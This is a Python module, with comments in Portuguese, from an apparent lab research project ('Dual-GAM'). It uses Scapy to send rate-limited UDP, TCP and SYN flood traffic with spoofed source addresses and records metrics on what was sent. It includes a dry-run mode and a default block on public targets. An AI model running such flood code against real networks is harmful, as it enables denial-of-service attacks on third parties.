"""
Dual-GAM — Sender (Scapy)

Recebe ``AttackParams`` do Translator e executa o tráfego no ambiente de rede
controlado pelo experimento. O componente também registra métricas daquilo que
foi solicitado e daquilo que o processo de envio efetivamente conseguiu produzir.

Observação metodológica: as métricas deste módulo descrevem o lado emissor. Elas
não substituem captura/PCAP no destino ou no switch, que será necessária para
medir o tráfego realmente observado pela rede.
"""

from __future__ import annotations

import ipaddress
import logging
import random
import time
from dataclasses import dataclass, field
from typing import Optional

logger = logging.getLogger(__name__)

import logging as _logging
_logging.getLogger("scapy").setLevel(_logging.CRITICAL)

try:
    from scapy.all import IP, TCP, UDP, Raw, send, conf as scapy_conf

    scapy_conf.verb = 0
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logger.warning("Scapy não disponível — usando modo simulação")

from translator.translator import AttackParams


@dataclass
class AttackResult:
    """Resultado auditável de uma execução do Sender."""

    params: AttackParams
    packets_sent: int
    bytes_sent: int
    duration_actual: float
    success: bool
    error: Optional[str] = None
    dry_run: bool = False

    pps_real: float = field(init=False)
    mbps_real: float = field(init=False)
    requested_packets: int = field(init=False)
    requested_pps: float = field(init=False)
    requested_duration: float = field(init=False)
    pps_error_ratio: float = field(init=False)
    duration_error_ratio: float = field(init=False)
    packet_delivery_ratio_sender: float = field(init=False)

    def __post_init__(self) -> None:
        duration = max(self.duration_actual, 0.001)
        self.pps_real = self.packets_sent / duration
        self.mbps_real = (self.bytes_sent * 8) / duration / 1e6

        self.requested_pps = float(self.params.packets_per_second)
        self.requested_duration = float(self.params.duration_seconds)
        self.requested_packets = int(round(self.requested_pps * self.requested_duration))

        self.pps_error_ratio = (
            abs(self.pps_real - self.requested_pps) / max(self.requested_pps, 1.0)
        )
        self.duration_error_ratio = (
            abs(self.duration_actual - self.requested_duration)
            / max(self.requested_duration, 0.001)
        )
        self.packet_delivery_ratio_sender = (
            self.packets_sent / max(self.requested_packets, 1)
        )

    def to_dict(self) -> dict[str, object]:
        return {
            "success": self.success,
            "error": self.error,
            "dry_run": self.dry_run,
            "requested": {
                "pps": self.requested_pps,
                "duration_seconds": self.requested_duration,
                "packets": self.requested_packets,
                "packet_size": self.params.packet_size,
            },
            "sender_observed": {
                "packets_sent": self.packets_sent,
                "bytes_sent": self.bytes_sent,
                "duration_seconds": self.duration_actual,
                "pps": self.pps_real,
                "mbps": self.mbps_real,
            },
            "errors": {
                "pps_relative": self.pps_error_ratio,
                "duration_relative": self.duration_error_ratio,
                "sender_packet_ratio": self.packet_delivery_ratio_sender,
            },
            "translation": {
                "valid": self.params.translation_valid,
                "warnings": list(self.params.translation_warnings),
                "consistency_error": self.params.consistency_error,
            },
        }


class Sender:
    """Executa ou simula o tráfego descrito por ``AttackParams``."""

    def __init__(
        self,
        iface: Optional[str] = None,
        dry_run: bool = False,
        require_private_target: bool = True,
    ):
        self.iface = iface
        self.dry_run = dry_run or not SCAPY_AVAILABLE
        self.require_private_target = require_private_target

        if self.dry_run:
            logger.warning("Sender em modo DRY RUN — nenhum pacote será enviado")

    def _validate_target(self, params: AttackParams) -> None:
        """Mantém a execução real restrita ao ambiente privado/local por padrão."""
        try:
            ip = ipaddress.ip_address(params.target_ip)
        except ValueError as exc:
            raise ValueError(f"Target IP inválido: {params.target_ip}") from exc

        if self.require_private_target and not (
            ip.is_private or ip.is_loopback or ip.is_link_local
        ):
            raise ValueError(
                "Execução real bloqueada para target não privado/local. "
                "Use o Sender apenas no ambiente controlado do experimento."
            )

    def executar(self, params: AttackParams) -> AttackResult:
        logger.info("Iniciando execução: %s", params)

        if not params.translation_valid:
            logger.warning(
                "Translator marcou o vetor como inconsistente: %s",
                "; ".join(params.translation_warnings) or "sem detalhes",
            )

        if self.dry_run:
            return self._simular(params)

        try:
            self._validate_target(params)
            if params.use_tcp:
                if params.use_syn_flood:
                    result = self._syn_flood(params)
                else:
                    result = self._tcp_flood(params)
            else:
                result = self._udp_flood(params)

            logger.info(
                "Sender concluído: %d pkt | %.1f pps (solicitado %.1f) | "
                "%.2f Mbps | duração %.3fs (solicitada %.3fs)",
                result.packets_sent,
                result.pps_real,
                result.requested_pps,
                result.mbps_real,
                result.duration_actual,
                result.requested_duration,
            )
            return result
        except Exception as exc:
            logger.exception("Erro durante a execução do Sender")
            return AttackResult(
                params=params,
                packets_sent=0,
                bytes_sent=0,
                duration_actual=0.0,
                success=False,
                error=str(exc),
                dry_run=False,
            )

    @staticmethod
    def _payload(length: int) -> bytes:
        return b"X" * max(int(length), 0)

    def _rate_limited_loop(self, params: AttackParams, packet_factory) -> AttackResult:
        packets_sent = 0
        bytes_sent = 0
        interval = 1.0 / max(params.packets_per_second, 1.0)

        start = time.monotonic()
        deadline = start + params.duration_seconds

        while time.monotonic() < deadline:
            pkt = packet_factory()
            send(pkt, iface=self.iface, verbose=False)
            packets_sent += 1
            bytes_sent += len(pkt)

            expected_elapsed = packets_sent * interval
            elapsed = time.monotonic() - start
            remaining_sleep = expected_elapsed - elapsed
            if remaining_sleep > 0:
                time.sleep(remaining_sleep)

        duration = time.monotonic() - start
        return AttackResult(
            params=params,
            packets_sent=packets_sent,
            bytes_sent=bytes_sent,
            duration_actual=duration,
            success=True,
            dry_run=False,
        )

    def _source_ip(self, params: AttackParams) -> Optional[str]:
        if not params.randomize_src_ip:
            return None

        # Em laboratório Docker, source spoofing usa apenas RFC1918 para evitar
        # gerar endereços públicos sintéticos desnecessários ao experimento.
        return f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    def _source_port(self, params: AttackParams) -> int:
        if params.randomize_src_port:
            return random.randint(1024, 65535)
        return 12345

    def _udp_flood(self, params: AttackParams) -> AttackResult:
        payload = self._payload(params.packet_size)

        def packet_factory():
            return (
                IP(src=self._source_ip(params), dst=params.target_ip)
                / UDP(sport=self._source_port(params), dport=params.target_port)
                / Raw(load=payload)
            )

        return self._rate_limited_loop(params, packet_factory)

    def _syn_flood(self, params: AttackParams) -> AttackResult:
        def packet_factory():
            return (
                IP(src=self._source_ip(params), dst=params.target_ip)
                / TCP(
                    sport=self._source_port(params),
                    dport=params.target_port,
                    flags="S",
                    window=params.window_size,
                    seq=random.randint(0, 2**32 - 1),
                )
            )

        return self._rate_limited_loop(params, packet_factory)

    def _tcp_flood(self, params: AttackParams) -> AttackResult:
        payload = self._payload(params.packet_size)

        def packet_factory():
            return (
                IP(src=self._source_ip(params), dst=params.target_ip)
                / TCP(
                    sport=self._source_port(params),
                    dport=params.target_port,
                    flags=params.tcp_flags,
                    window=params.window_size,
                )
                / Raw(load=payload)
            )

        return self._rate_limited_loop(params, packet_factory)

    def _simular(self, params: AttackParams) -> AttackResult:
        requested = int(round(params.packets_per_second * params.duration_seconds))
        logger.info(
            "[DRY RUN] Simulando %d pacotes de %dB para %s:%d",
            requested,
            params.packet_size,
            params.target_ip,
            params.target_port,
        )

        # Não dorme pelo tempo total do ataque: o dry-run serve para validar o
        # pipeline e métricas, não para emular o custo temporal do envio real.
        return AttackResult(
            params=params,
            packets_sent=requested,
            bytes_sent=requested * params.packet_size,
            duration_actual=params.duration_seconds,
            success=True,
            dry_run=True,
        )
